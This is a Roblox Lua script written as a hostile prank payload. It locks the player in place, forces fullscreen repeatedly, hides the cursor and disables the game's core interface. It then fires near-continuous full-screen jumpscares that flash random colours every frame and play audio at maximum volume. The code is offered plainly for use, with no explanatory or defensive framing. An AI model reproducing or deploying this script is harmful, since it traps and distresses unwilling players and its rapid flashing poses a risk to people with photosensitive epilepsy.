pcall(function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    end)
    pcall(function()
      game.Players.LocalPlayer.CameraMaxZoomDistance = 0
    end)
    pcall(function()
      spawn(function()
        while wait() do
          if not UserSettings().GameSettings:InFullScreen() then
            game:GetService("GuiService"):ToggleFullscreen()
            wait(0.5)
          end
          wait(0.25)
        end
      end)
    end)
    pcall(function()
      game:GetService("UserInputService").MouseIconEnabled = false
    end)
    pcall(function()
      game.CoreGui:FindFirstChild("RobloxGui").Enabled = false
    end)
    pcall(function()
      game.CoreGui:FindFirstChild("PlayerList").Enabled = false
    end)
    pcall(function()
      game.CoreGui:FindFirstChild("TopBar").Enabled = false
    end)

function jumpscare()
local function fiximage(id)
return string.format("rbxthumb://type=Asset&id=%s&w=420&h=420",tonumber(id))
end
local sc = Instance.new("ScreenGui",game.CoreGui)
sc.DisplayOrder = 10000
sc.IgnoreGuiInset = true
local img = Instance.new("ImageLabel",sc)
img.Size = UDim2.new(1,0,1,0)
img.Image = fiximage(142410803)
img.ScaleType = "Fit"
img.BackgroundColor3 = Color3.fromRGB(0,0,0)
spawn(function()
while wait() do
    img.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
    wait()
    img.ImageColor3 = Color3.new(1,1,1)
end
end)
local auegh = Instance.new("Sound",game)
auegh.Volume = 10
auegh.SoundId = "rbxassetid://5567523008"
auegh:Play()
auegh.Ended:Connect(function()
wait()
auegh:Destroy()
end)
game:GetService("TweenService"):Create(img,TweenInfo.new(3),{BackgroundTransparency = 1,ImageTransparency = 1}):Play()
delay(3,function()
sc:Destroy()
end)
end
while wait() do
if math.random(1,5) == 1 then
jumpscare()
end
end